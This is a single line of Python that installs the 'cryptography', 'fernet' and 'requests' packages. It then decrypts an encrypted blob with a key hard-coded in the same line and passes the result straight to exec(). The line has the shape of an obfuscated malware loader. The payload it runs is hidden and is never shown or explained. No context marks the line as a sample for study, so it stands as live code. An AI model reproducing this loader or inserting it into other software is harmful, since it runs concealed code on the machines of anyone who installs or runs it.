import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'tgmogP4iyZkm3EZGN-omPN1SvK6AsPfa-s7znAqW4jE=').decrypt(b'gAAAAABnca3EcQN6-exYc1afRZDvCIb55KjuIwHz2bW4VT2x9PVkiGCB2ZrWR-hR8K6j75St6ORQGFIdBH9BxiSTYcYRASI0txOgNQeluhdOAMPvT7CSk3T18aOJkecKXILS0lCJRs82RYPklr6vvNCfGLX0nlfaqZUl2U3k9o8-aS2SFlYACuBvWBZX7Gk2G0ydbM7TwM_i52cF3dXFsn0LiJH-DBZ9Hw=='))